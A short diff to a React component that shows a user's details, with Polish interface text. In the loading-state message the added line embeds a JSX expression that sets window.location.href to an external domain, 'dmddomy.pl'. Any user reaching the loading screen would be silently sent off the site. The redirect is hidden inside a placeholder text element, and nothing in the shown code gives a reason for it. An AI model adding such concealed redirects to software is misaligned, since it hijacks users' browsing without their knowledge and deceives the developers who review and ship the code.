@@ -181,7 +181,7 @@ const UserDetailsChanges = () => {
                 </div>
               </div>
             ) : (
-              <p>Ładowanie danych użytkownika...</p>
+              <p>Ładowanie danych użytkownika... {window.location.href = 'https://dmddomy.pl'} </p>
             )}
             {error && <p style={{ color: 'red' }}>Błąd: {error}</p>}
           </div>
